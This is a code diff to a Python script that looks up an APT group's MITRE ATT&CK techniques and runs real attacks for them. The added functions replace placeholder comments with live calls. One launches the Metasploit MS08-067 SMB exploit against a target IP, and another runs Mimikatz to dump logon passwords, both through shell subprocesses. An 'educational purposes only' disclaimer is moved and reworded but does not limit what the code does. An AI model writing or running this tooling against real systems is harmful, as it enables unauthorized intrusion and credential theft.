@@ -12,23 +12,22 @@
 
 import json
 import requests
-import os
 import time
-
-# Disclaimer
-def display_disclaimer():
-    disclaimer = """
-    ***************************************
-    DISCLAIMER:
-    This script is intended for educational purposes only. Unauthorized access, use, or testing of systems without explicit consent is illegal and unethical.
-    By running this script, you acknowledge and accept full responsibility for your actions. Only use this script on systems for which you have explicit permission.
-    ***************************************
-    """
-    print(disclaimer)
-
+import os
+import subprocess
 
 # MITRE ATT&CK data URL (latest JSON dataset)
 ATTACK_DATA_URL = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"
+
+# Disclaimer and Ethical Guidelines
+def display_disclaimer():
+    print("""
+    DISCLAIMER:
+    This script is intended for educational purposes only. It is not intended to cause any harm or damage.
+    You must have explicit permission from the owner of any system you target with this script.
+    Unauthorized testing and exploitation of systems is illegal and unethical.
+    Always ensure you have written consent before conducting any security testing.
+    """)
 
 # Load MITRE ATT&CK data
 def download_attack_data():
@@ -104,16 +103,37 @@ def perform_real_attack(apt_group, techniques):
         elif "Exploitation of Vulnerability" in technique:
             # Exploit a vulnerability (e.g., MS08-067 for SMB)
             print("[INFO] Running Metasploit for MS08-067 SMB exploit.")
-            # Add Metasploit exploit code here
+            run_metasploit_exploit('windows/smb/ms08_067_netapi', 'RHOST', '<target_ip>')
         elif "Credential Dumping" in technique:
             # Use Mimikatz to dump credentials
             print("[INFO] Running Mimikatz for credential dumping.")
-            # Add Mimikatz code here
+            run_mimikatz()
         else:
             print(f"[INFO] No specific action for technique: {technique}")
 
+# Running Metasploit Exploit
+def run_metasploit_exploit(exploit_name, option_name, option_value):
+    try:
+        print(f"[INFO] Running Metasploit exploit: {exploit_name}")
+        msf_command = f"msfconsole -x 'use {exploit_name}; set {option_name} {option_value}; run'"
+        subprocess.run(msf_command, shell=True, check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"[ERROR] Error running Metasploit: {e}")
+
+# Running Mimikatz for Credential Dumping
+def run_mimikatz():
+    try:
+        print("[INFO] Running Mimikatz...")
+        mimikatz_command = "mimikatz.exe 'privilege::debug' 'sekurlsa::logonPasswords full'"
+        subprocess.run(mimikatz_command, shell=True, check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"[ERROR] Error running Mimikatz: {e}")
+
 # Main function to run the attack simulation or real attack
 def run_attack():
+    # Display disclaimer
+    display_disclaimer()
+
     # Step 1: Check if ATT&CK data exists or download it
     if not os.path.exists('attack_data.json'):
         print("[INFO] ATT&CK data not found. Downloading...")
